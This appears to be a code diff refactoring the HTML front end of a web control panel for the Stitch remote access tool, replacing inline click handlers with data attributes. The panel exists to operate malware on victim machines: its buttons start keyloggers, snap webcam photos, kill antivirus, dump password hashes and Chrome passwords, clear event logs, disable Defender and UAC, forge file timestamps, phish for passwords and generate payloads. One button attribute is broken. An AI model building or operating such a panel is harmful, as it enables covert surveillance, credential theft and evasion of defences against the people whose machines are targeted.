@@ -73,15 +73,15 @@
                 
                 <div class="connections-header">
                     <h2>Connections</h2>
-                    <button class="refresh-btn" onclick="loadConnections()">
+                    <button class="refresh-btn" id="refreshConnectionsBtn">
                         🔄 Refresh
                     </button>
                 </div>
                 
                 <!-- Search and Filter -->
                 <div class="search-container">
-                    <input type="text" id="connectionsSearch" class="search-input" placeholder="🔍 Search by IP, OS, hostname..." onkeyup="filterConnections()">
-                    <select id="connectionsFilter" class="filter-select" onchange="filterConnections()">
+                    <input type="text" id="connectionsSearch" class="search-input" placeholder="🔍 Search by IP, OS, hostname...">
+                    <select id="connectionsFilter" class="filter-select">
                         <option value="all">All Status</option>
                         <option value="online">Online Only</option>
                         <option value="offline">Offline Only</option>
@@ -116,39 +116,39 @@
                 
                 <div class="command-interface">
                     <div class="command-categories">
-                        <button class="cat-btn active" onclick="showCommands('security')">🔥 Control & Exploit</button>
-                        <button class="cat-btn" onclick="showCommands('windows')">🪟 Windows</button>
-                        <button class="cat-btn" onclick="showCommands('files')">📁 Files</button>
-                        <button class="cat-btn" onclick="showCommands('network')">🌐 Network</button>
-                        <button class="cat-btn" onclick="showCommands('system')">📊 System Info</button>
-                        <button class="cat-btn" onclick="showCommands('admin')">⚙️ Admin</button>
-                        <button class="cat-btn" onclick="showCommands('macos')">🍎 macOS/Linux</button>
-                        <button class="cat-btn" onclick="showCommands('custom')">⌨️ Custom</button>
+                        <button class="cat-btn active" data-category="security">🔥 Control & Exploit</button>
+                        <button class="cat-btn" data-category="windows">🪟 Windows</button>
+                        <button class="cat-btn" data-category="files">📁 Files</button>
+                        <button class="cat-btn" data-category="network">🌐 Network</button>
+                        <button class="cat-btn" data-category="system">📊 System Info</button>
+                        <button class="cat-btn" data-category="admin">⚙️ Admin</button>
+                        <button class="cat-btn" data-category="macos">🍎 macOS/Linux</button>
+                        <button class="cat-btn" data-category="custom">⌨️ Custom</button>
                     </div>
                     
                     <!-- Control & Exploit - Most Ruthless Commands First -->
                     <div id="securityCommands" class="command-group active">
                         <h3>🔥 Control & Exploit (19 commands)</h3>
                         <div class="command-buttons">
-                            <button class="cmd-btn" onclick="executeCommand('keylogger status')" title="Check keylogger status">Keylog Status</button>
-                            <button class="cmd-btn" onclick="executeCommand('keylogger start')" title="Start keylogger">Keylog Start</button>
-                            <button class="cmd-btn" onclick="executeCommand('keylogger stop')" title="Stop keylogger">Keylog Stop</button>
-                            <button class="cmd-btn" onclick="executeCommand('keylogger dump')" title="Dump recorded keystrokes">Keylog Dump</button>
-                            <button class="cmd-btn" onclick="executeCommand('screenshot')" title="Capture screenshot">Screenshot</button>
-                            <button class="cmd-btn" onclick="executeCommand('webcamlist')" title="List connected webcams">Webcam List</button>
-                            <button class="cmd-btn" onclick="executeCommandWithParam('webcamsnap')" title="Take webcam picture (device)">Webcam Snap</button>
-                            <button class="cmd-btn" onclick="executeCommand('avscan')" title="Scan for antivirus software">AV Scan</button>
-                            <button class="cmd-btn" onclick="executeCommand('avkill')" title="Terminate antivirus processes">AV Kill</button>
-                            <button class="cmd-btn" onclick="executeCommand('hashdump')" title="Grab password hashes">Hash Dump</button>
-                            <button class="cmd-btn" onclick="executeCommand('wifikeys')" title="Display saved WiFi passwords">WiFi Keys</button>
-                            <button class="cmd-btn" onclick="executeCommand('freeze status')" title="Check input freeze status">Freeze Status</button>
-                            <button class="cmd-btn" onclick="executeCommand('freeze start')" title="Freeze mouse and keyboard">Freeze Start</button>
-                            <button class="cmd-btn" onclick="executeCommand('freeze stop')" title="Unfreeze mouse and keyboard">Freeze Stop</button>
-                            <button class="cmd-btn" onclick="executeCommand('popup')" title="Display custom popup message">Popup</button>
-                            <button class="cmd-btn" onclick="executeCommand('displayoff')" title="Turn off display monitors">Display Off</button>
-                            <button class="cmd-btn" onclick="executeCommand('displayon')" title="Turn on display monitors">Display On</button>
-                            <button class="cmd-btn" onclick="executeCommand('lockscreen')" title="Lock system screen">Lock Screen</button>
-                            <button class="cmd-btn" onclick="executeCommand('logintext')" title="Set login screen text">Login Text</button>
+                            <button class="cmd-btn" data-command="keylogger status" title="Check keylogger status">Keylog Status</button>
+                            <button class="cmd-btn" data-command="keylogger start" title="Start keylogger">Keylog Start</button>
+                            <button class="cmd-btn" data-command="keylogger stop" title="Stop keylogger">Keylog Stop</button>
+                            <button class="cmd-btn" data-command="keylogger dump" title="Dump recorded keystrokes">Keylog Dump</button>
+                            <button class="cmd-btn" data-command="screenshot" title="Capture screenshot">Screenshot</button>
+                            <button class="cmd-btn" data-command="webcamlist" title="List connected webcams">Webcam List</button>
+                            <button class="cmd-btn" data-command="webcamsnap" data-with-params="true" title="Take webcam picture (device)">Webcam Snap</button>
+                            <button class="cmd-btn" data-command="avscan" title="Scan for antivirus software">AV Scan</button>
+                            <button class="cmd-btn" data-command="avkill" title="Terminate antivirus processes">AV Kill</button>
+                            <button class="cmd-btn" data-command="hashdump" title="Grab password hashes">Hash Dump</button>
+                            <button class="cmd-btn" data-command="wifikeys" title="Display saved WiFi passwords">WiFi Keys</button>
+                            <button class="cmd-btn" data-command="freeze status" title="Check input freeze status">Freeze Status</button>
+                            <button class="cmd-btn" data-command="freeze start" title="Freeze mouse and keyboard">Freeze Start</button>
+                            <button class="cmd-btn" data-command="freeze stop" title="Unfreeze mouse and keyboard">Freeze Stop</button>
+                            <button class="cmd-btn" data-command="popup" title="Display custom popup message">Popup</button>
+                            <button class="cmd-btn" data-command="displayoff" title="Turn off display monitors">Display Off</button>
+                            <button class="cmd-btn" data-command="displayon" title="Turn on display monitors">Display On</button>
+                            <button class="cmd-btn" data-command="lockscreen" title="Lock system screen">Lock Screen</button>
+                            <button class="cmd-btn" data-command="logintext" title="Set login screen text">Login Text</button>
                         </div>
                     </div>
                     
@@ -156,47 +156,47 @@
                     <div id="windowsCommands" class="command-group">
                         <h3>🪟 Windows-Specific (9 commands)</h3>
                         <div class="command-buttons">
-                            <button class="cmd-btn" onclick="executeCommand('chromedump')" title="Retrieve Chrome saved passwords">Chrome Dump</button>
-                            <button class="cmd-btn" onclick="executeCommand('clearev')" title="Clear Windows event logs">Clear Events</button>
-                            <button class="cmd-btn" onclick="executeCommand('scanreg')" title="Display Registry information">Scan Registry</button>
-                            <button class="cmd-btn" onclick="executeCommand('disableRDP')" title="Disable Remote Desktop Protocol">Disable RDP</button>
-                            <button class="cmd-btn" onclick="executeCommand('enableRDP')" title="Enable Remote Desktop Protocol">Enable RDP</button>
-                            <button class="cmd-btn" onclick="executeCommand('disableUAC')" title="Disable User Account Control">Disable UAC</button>
-                            <button class="cmd-btn" onclick="executeCommand('enableUAC')" title="Enable User Account Control">Enable UAC</button>
-                            <button class="cmd-btn" onclick="executeCommand('disableWindef')" title="Disable Windows Defender">Disable Defender</button>
-                            <button class="cmd-btn" onclick="executeCommand('enableWindef')" title="Enable Windows Defender">Enable Defender</button>
+                            <button class="cmd-btn" data-command="chromedump" title="Retrieve Chrome saved passwords">Chrome Dump</button>
+                            <button class="cmd-btn" data-command="clearev" title="Clear Windows event logs">Clear Events</button>
+                            <button class="cmd-btn" data-command="scanreg" title="Display Registry information">Scan Registry</button>
+                            <button class="cmd-btn" data-command="disableRDP" title="Disable Remote Desktop Protocol">Disable RDP</button>
+                            <button class="cmd-btn" data-command="enableRDP" title="Enable Remote Desktop Protocol">Enable RDP</button>
+                            <button class="cmd-btn" data-command="disableUAC" title="Disable User Account Control">Disable UAC</button>
+                            <button class="cmd-btn" data-command="enableUAC" title="Enable User Account Control">Enable UAC</button>
+                            <button class="cmd-btn" data-command="disableWindef" title="Disable Windows Defender">Disable Defender</button>
+                            <button class="cmd-btn" data-command="enableWindef" title="Enable Windows Defender">Enable Defender</button>
                         </div>
                     </div>
                     
                     <div id="filesCommands" class="command-group">
                         <h3>📁 File Operations (12 commands)</h3>
                         <div class="command-buttons">
-                            <button class="cmd-btn" onclick="executeCommandWithParam('download')" title="Download file from target">Download</button>
-                            <button class="cmd-btn" onclick="executeCommandWithParam('upload')" title="Upload file to target">Upload</button>
-                            <button class="cmd-btn" onclick="executeCommandWithParam('cat')" title="Display file contents">View File (cat)</button>
-                            <button class="cmd-btn" onclick="executeCommandWithParam('more')" title="Display file output">More</button>
-                            <button class="cmd-btn" onclick="executeCommandWithParam('touch')" title="Create empty file">Create File</button>
-                            <button class="cmd-btn" onclick="executeCommandWithParam('fileinfo')" title="Display file information">File Info</button>
-                            <button class="cmd-btn" onclick="executeCommandWithParam('hide')" title="Hide file or directory">Hide</button>
-                            <button class="cmd-btn" onclick="executeCommandWithParam('unhide')" title="Unhide file or directory">Unhide</button>
-                            <button class="cmd-btn" onclick="executeCommandWithParam('editaccessed')" title="Edit file accessed timestamp">Edit Accessed</button>
-                            <button class="cmd-btn" onclick="executeCommandWithParam('editcreated')" title="Edit file created timestamp">Edit Created</button>
-                            <button class="cmd-btn" onclick="executeCommandWithParam('editmodified')" title="Edit file modified timestamp">Edit Modified</button>
-                            <button class="cmd-btn" onclick="executeCommandWithParam('cd')" title="Change directory">Change Dir</button>
+                            <button class="cmd-btn" data-command="download" data-with-params="true" title="Download file from target">Download</button>
+                            <button class="cmd-btn" data-command="upload" data-with-params="true" title="Upload file to target">Upload</button>
+                            <button class="cmd-btn" data-command="cat" data-with-params="true" title="Display file contents">View File (cat)</button>
+                            <button class="cmd-btn" data-command="more" data-with-params="true" title="Display file output">More</button>
+                            <button class="cmd-btn" data-command="touch" data-with-params="true" title="Create empty file">Create File</button>
+                            <button class="cmd-btn" data-command="fileinfo" data-with-params="true" title="Display file information">File Info</button>
+                            <button class="cmd-btn" data-command="hide" data-with-params="true" title="Hide file or directory">Hide</button>
+                            <button class="cmd-btn" data-command="unhide" data-with-params="true" title="Unhide</button>
+                            <button class="cmd-btn" data-command="editaccessed" data-with-params="true" title="Edit file accessed timestamp">Edit Accessed</button>
+                            <button class="cmd-btn" data-command="editcreated" data-with-params="true" title="Edit file created timestamp">Edit Created</button>
+                            <button class="cmd-btn" data-command="editmodified" data-with-params="true" title="Edit file modified timestamp">Edit Modified</button>
+                            <button class="cmd-btn" data-command="cd" data-with-params="true" title="Change directory">Change Dir</button>
                         </div>
                     </div>
                     
                     <div id="networkCommands" class="command-group">
                         <h3>🌐 Network (8 commands)</h3>
                         <div class="command-buttons">
-                            <button class="cmd-btn" onclick="executeCommand('ipconfig')" title="Display network configuration">IP Config</button>
-                            <button class="cmd-btn" onclick="executeCommand('firewall status')" title="Check firewall status">Firewall Status</button>
-                            <button class="cmd-btn" onclick="executeCommandWithParam('firewall open')" title="Open firewall port (port in/out tcp/udp)">Firewall Open</button>
-                            <button class="cmd-btn" onclick="executeCommandWithParam('firewall close')" title="Close firewall port (port in/out tcp/udp)">Firewall Close</button>
-                            <button class="cmd-btn" onclick="executeCommand('hostsfile show')" title="Display hosts file">Show Hosts</button>
-                            <button class="cmd-btn" onclick="executeCommandWithParam('hostsfile update')" title="Update hosts entry (hostname ip)">Update Hosts</button>
-                            <button class="cmd-btn" onclick="executeCommandWithParam('hostsfile remove')" title="Remove hosts entry (hostname)">Remove Hosts</button>
-                            <button class="cmd-btn" onclick="executeCommand('ssh')" title="Open SSH connection">SSH</button>
+                            <button class="cmd-btn" data-command="ipconfig" title="Display network configuration">IP Config</button>
+                            <button class="cmd-btn" data-command="firewall status" title="Check firewall status">Firewall Status</button>
+                            <button class="cmd-btn" data-command="firewall open" data-with-params="true" title="Open firewall port (port in/out tcp/udp)">Firewall Open</button>
+                            <button class="cmd-btn" data-command="firewall close" data-with-params="true" title="Close firewall port (port in/out tcp/udp)">Firewall Close</button>
+                            <button class="cmd-btn" data-command="hostsfile show" title="Display hosts file">Show Hosts</button>
+                            <button class="cmd-btn" data-command="hostsfile update" data-with-params="true" title="Update hosts entry (hostname ip)">Update Hosts</button>
+                            <button class="cmd-btn" data-command="hostsfile remove" data-with-params="true" title="Remove hosts entry (hostname)">Remove Hosts</button>
+                            <button class="cmd-btn" data-command="ssh" title="Open SSH connection">SSH</button>
                         </div>
                     </div>
                     
@@ -204,48 +204,48 @@
                     <div id="systemCommands" class="command-group">
                         <h3>📊 System Information (9 commands)</h3>
                         <div class="command-buttons">
-                            <button class="cmd-btn" onclick="executeCommand('sysinfo')" title="Complete system information">System Info</button>
-                            <button class="cmd-btn" onclick="executeCommand('environment')" title="Display environment variables">Environment</button>
-                            <button class="cmd-btn" onclick="executeCommand('ps')" title="List all running processes">Processes</button>
-                            <button class="cmd-btn" onclick="executeCommand('lsmod')" title="List installed drivers/kernel modules">List Modules</button>
-                            <button class="cmd-btn" onclick="executeCommand('drives')" title="Display drive information">Drives</button>
-                            <button class="cmd-btn" onclick="executeCommand('location')" title="Get public IP and geo-location">Location</button>
-                            <button class="cmd-btn" onclick="executeCommand('vmscan')" title="Detect virtual machine">VM Scan</button>
-                            <button class="cmd-btn" onclick="executeCommand('pwd')" title="Print working directory">Working Dir</button>
-                            <button class="cmd-btn" onclick="executeCommand('ls')" title="List files and directories">List Files</button>
-                            <button class="cmd-btn" onclick="executeCommandWithParam('dir')" title="Windows dir alias">Dir (Win)</button>
+                            <button class="cmd-btn" data-command="sysinfo" title="Complete system information">System Info</button>
+                            <button class="cmd-btn" data-command="environment" title="Display environment variables">Environment</button>
+                            <button class="cmd-btn" data-command="ps" title="List all running processes">Processes</button>
+                            <button class="cmd-btn" data-command="lsmod" title="List installed drivers/kernel modules">List Modules</button>
+                            <button class="cmd-btn" data-command="drives" title="Display drive information">Drives</button>
+                            <button class="cmd-btn" data-command="location" title="Get public IP and geo-location">Location</button>
+                            <button class="cmd-btn" data-command="vmscan" title="Detect virtual machine">VM Scan</button>
+                            <button class="cmd-btn" data-command="pwd" title="Print working directory">Working Dir</button>
+                            <button class="cmd-btn" data-command="ls" title="List files and directories">List Files</button>
+                            <button class="cmd-btn" data-command="dir" data-with-params="true" title="Windows dir alias">Dir (Win)</button>
                         </div>
                     </div>
                     
                     <div id="macosCommands" class="command-group">
                         <h3>🍎 macOS / Linux (2 commands)</h3>
                         <div class="command-buttons">
-                            <button class="cmd-btn" onclick="executeCommand('askpassword')" title="Display password prompt to user">Ask Password</button>
-                            <button class="cmd-btn" onclick="executeCommand('crackpassword')" title="Crack sudo password via dictionary attack">Crack Password</button>
+                            <button class="cmd-btn" data-command="askpassword" title="Display password prompt to user">Ask Password</button>
+                            <button class="cmd-btn" data-command="crackpassword" title="Crack sudo password via dictionary attack">Crack Password</button>
                         </div>
                     </div>
                     
                     <div id="adminCommands" class="command-group">
                         <h3>⚙️ Administrative & Server (16 commands)</h3>
                         <div class="command-buttons">
-                            <button class="cmd-btn" onclick="executeCommandWithParam('sudo')" title="Execute with admin privileges">Sudo</button>
-                            <button class="cmd-btn" onclick="executeCommandWithParam('pyexec')" title="Execute Python script on target">Python Exec</button>
-                            <button class="cmd-btn" onclick="executeCommandWithParam('run')" title="Start file or application">Run / Start</button>
-                            <button class="cmd-btn" onclick="executeCommand('sessions')" title="Display available sessions">Sessions</button>
-                            <button class="cmd-btn" onclick="executeCommandWithParam('shell')" title="Open shell for specific session">Shell</button>
-                            <button class="cmd-btn" onclick="executeCommand('history')" title="View connection history">History</button>
-                            <button class="cmd-btn" onclick="executeCommandWithParam('history_remove')" title="Remove from history">Remove History</button>
-                            <button class="cmd-btn" onclick="executeCommandWithParam('addkey')" title="Add AES encryption key">Add Key</button>
-                            <button class="cmd-btn" onclick="executeCommand('showkey')" title="Display active AES key">Show Key</button>
-                            <button class="cmd-btn" onclick="executeCommand('stitchgen')" title="Generate Stitch payloads">Stitch Gen</button>
-                            <button class="cmd-btn" onclick="executeCommand('clear')" title="Clear screen">Clear Screen</button>
-                            <button class="cmd-btn" onclick="executeCommand('home')" title="Display Stitch banner">Home</button>
-                            <button class="cmd-btn" onclick="executeCommandWithParam('connect')" title="Connect to target (target port)">Connect</button>
-                            <button class="cmd-btn" onclick="executeCommandWithParam('listen')" title="Listen for connections (port)">Listen</button>
-                            <button class="cmd-btn" onclick="executeCommand('ifconfig')" title="Display network configuration (Linux)">ifconfig</button>
-                            <button class="cmd-btn" onclick="executeCommand('dir')" title="List files (Windows alias)">Dir</button>
-                            <button class="cmd-btn" onclick="executeCommandWithParam('netstat')" title="Network connections">Netstat</button>
-                            <button class="cmd-btn" onclick="executeCommandWithParam('portscan')" title="Scan ports on host">Port Scan</button>
+                            <button class="cmd-btn" data-command="sudo" data-with-params="true" title="Execute with admin privileges">Sudo</button>
+                            <button class="cmd-btn" data-command="pyexec" data-with-params="true" title="Execute Python script on target">Python Exec</button>
+                            <button class="cmd-btn" data-command="run" data-with-params="true" title="Start file or application">Run / Start</button>
+                            <button class="cmd-btn" data-command="sessions" title="Display available sessions">Sessions</button>
+                            <button class="cmd-btn" data-command="shell" data-with-params="true" title="Open shell for specific session">Shell</button>
+                            <button class="cmd-btn" data-command="history" title="View connection history">History</button>
+                            <button class="cmd-btn" data-command="history_remove" data-with-params="true" title="Remove from history">Remove History</button>
+                            <button class="cmd-btn" data-command="addkey" data-with-params="true" title="Add AES encryption key">Add Key</button>
+                            <button class="cmd-btn" data-command="showkey" title="Display active AES key">Show Key</button>
+                            <button class="cmd-btn" data-command="stitchgen" title="Generate Stitch payloads">Stitch Gen</button>
+                            <button class="cmd-btn" data-command="clear" title="Clear screen">Clear Screen</button>
+                            <button class="cmd-btn" data-command="home" title="Display Stitch banner">Home</button>
+                            <button class="cmd-btn" data-command="connect" data-with-params="true" title="Connect to target (target port)">Connect</button>
+                            <button class="cmd-btn" data-command="listen" data-with-params="true" title="Listen for connections (port)">Listen</button>
+                            <button class="cmd-btn" data-command="ifconfig" title="Display network configuration (Linux)">ifconfig</button>
+                            <button class="cmd-btn" data-command="dir" title="List files (Windows alias)">Dir</button>
+                            <button class="cmd-btn" data-command="netstat" data-with-params="true" title="Network connections">Netstat</button>
+                            <button class="cmd-btn" data-command="portscan" data-with-params="true" title="Scan ports on host">Port Scan</button>
                         </div>
                     </div>
                     
@@ -254,7 +254,7 @@
                         <p class="help-text" style="margin-bottom: 1rem;">Enter any Stitch command manually. Supports all 75+ commands with parameters.</p>
                         <div class="command-input-section">
                             <input type="text" id="customCommandInput" placeholder="e.g., download /etc/passwd, sudo systemctl status, etc...">
-                            <button class="cmd-btn" onclick="executeCustomCommand()">Execute</button>
+                            <button class="cmd-btn" id="executeCustomBtn">Execute</button>
                         </div>
                     </div>
                     
@@ -262,8 +262,8 @@
                         <div class="output-header">
                             <h3>Command Output</h3>
                             <div class="output-actions">
-                                <button class="clear-btn" onclick="copyOutput()">📋 Copy</button>
-                                <button class="clear-btn" onclick="clearOutput()">Clear</button>
+                                <button class="clear-btn" id="copyOutputBtn">📋 Copy</button>
+                                <button class="clear-btn" id="clearOutputBtn">Clear</button>
                             </div>
                         </div>
                         <pre id="commandOutput">Ready to execute commands...</pre>
@@ -294,8 +294,8 @@
                         <p><strong>Selected:</strong> <span id="fileName"></span></p>
                         <p><strong>Size:</strong> <span id="fileSize"></span></p>
                         <div class="upload-actions">
-                            <button class="cmd-btn" onclick="uploadFile()">Upload to Target</button>
-                            <button class="clear-btn" onclick="cancelUpload()">Cancel</button>
+                            <button class="cmd-btn" id="uploadSubmitBtn">Upload to Target</button>
+                            <button class="clear-btn" id="uploadCancelBtn">Cancel</button>
                         </div>
                     </div>
                     <div class="upload-progress" id="uploadProgress" style="display: none;">
@@ -370,10 +370,10 @@
                             </div>
                             
                             <div class="form-actions">
-                                <button type="button" class="cmd-btn" onclick="generatePayload()">
+                                <button type="button" class="cmd-btn" id="generatePayloadBtn">
                                     🚀 Generate Payload
                                 </button>
-                                <button type="button" class="clear-btn" onclick="resetPayloadForm()">
+                                <button type="button" class="clear-btn" id="resetPayloadBtn">
                                     Reset
                                 </button>
                             </div>
@@ -384,10 +384,10 @@
                         <h3>Generated Payload</h3>
                         <div class="payload-info" id="payloadInfo"></div>
                         <div class="payload-actions">
-                            <button class="cmd-btn" onclick="downloadPayload()">
+                            <button class="cmd-btn" id="downloadPayloadBtn">
                                 📥 Download Payload
                             </button>
-                            <button class="clear-btn" onclick="copyPayloadInfo()">
+                            <button class="clear-btn" id="copyPayloadInfoBtn">
                                 📋 Copy Info
                             </button>
                         </div>
@@ -426,10 +426,10 @@
                 <div class="export-container">
                     <h3>📥 Export Data</h3>
                     <div class="export-buttons">
-                        <button class="cmd-btn" onclick="exportLogs('json')">📋 Export Logs (JSON)</button>
-                        <button class="cmd-btn" onclick="exportLogs('csv')">📄 Export Logs (CSV)</button>
-                        <button class="cmd-btn" onclick="exportCommandHistory('json')">⚡ Export Commands (JSON)</button>
-                        <button class="cmd-btn" onclick="exportCommandHistory('csv')">⚡ Export Commands (CSV)</button>
+                        <button class="cmd-btn" data-export-type="logs" data-format="json">📋 Export Logs (JSON)</button>
+                        <button class="cmd-btn" data-export-type="logs" data-format="csv">📄 Export Logs (CSV)</button>
+                        <button class="cmd-btn" data-export-type="commands" data-format="json">⚡ Export Commands (JSON)</button>
+                        <button class="cmd-btn" data-export-type="commands" data-format="csv">⚡ Export Commands (CSV)</button>
                     </div>
                 </div>
                 
@@ -442,8 +442,8 @@
                 
                 <div class="logs-container">
                     <div class="logs-header">
-                        <button class="refresh-btn" onclick="loadLogs()">🔄 Refresh</button>
-                        <button class="clear-btn" onclick="clearDebugLogs()">Clear</button>
+                        <button class="refresh-btn" id="refreshLogsBtn">🔄 Refresh</button>
+                        <button class="clear-btn" id="clearLogsBtn">Clear</button>
                     </div>
                     <div id="debugLogs" class="logs-output">
                         <p class="log-entry">System initialized...</p>
